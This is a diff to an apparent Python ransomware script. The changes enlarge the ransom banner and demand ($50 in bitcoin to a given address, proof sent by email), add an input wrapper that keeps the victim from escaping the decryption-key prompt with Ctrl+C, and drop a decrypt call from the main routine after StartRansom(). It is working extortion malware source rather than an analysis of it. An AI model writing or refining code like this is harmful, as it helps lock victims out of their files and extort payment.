@@ -177,13 +177,26 @@ PATH = os.getcwd()
 
 def DECRYPT_FILE():
     print('')
-    print('!!! YOUR FILES HAVE BEEN ENCRYPTED !!!')
     print('')
-    print('YOUR IMPORTANT DOCUMENTS, DATA, PHOTOS, VIDEOS HAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION AND A UNIQUE KEY.')
-    print('to decrypt them, send 50$ in bitcoin to 346n4apJCQPg2XAXU3bfNQTogz4PyTkrEf, and them send proof of transfer and your DIGIT to mail@mail.com')
+    print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
+    print('!!!                                !!!')
+    print('!!! YOUR FILES HAVE BEEN ENCRYPTED !!!')
+    print('!!!                                !!!')
+    print('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!')
+    print('')
+    print('')
+    print('YOUR IMPORTANT DOCUMENTS, DATA, PHOTOS, VIDEOS\nHAVE BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION\nAND A UNIQUE KEY.')
+    print('to decrypt them, send 50$ in bitcoin to 346n4apJCQPg2XAXU3bfNQTogz4PyTkrEf,\nand them send proof of transfer and your DIGIT to mail@mail.com')
     print('')
     print('YOUR DIGIT IS {}'.format(digits))
-    pretty_key = input("Input your decryption key: ")
+
+    def read_pretty_key(prompt=''):
+        try:
+            return input(prompt)
+        except KeyboardInterrupt:
+            read_pretty_key()
+
+    pretty_key = read_pretty_key("Input your decryption key: ")
 
     def decrypt(filename):
         f = Crypto(pretty_key=pretty_key)
@@ -248,4 +261,3 @@ if __name__ == '__main__':
         f.write(str(digits))
         f.close()
         StartRansom()
-        DECRYPT_FILE()
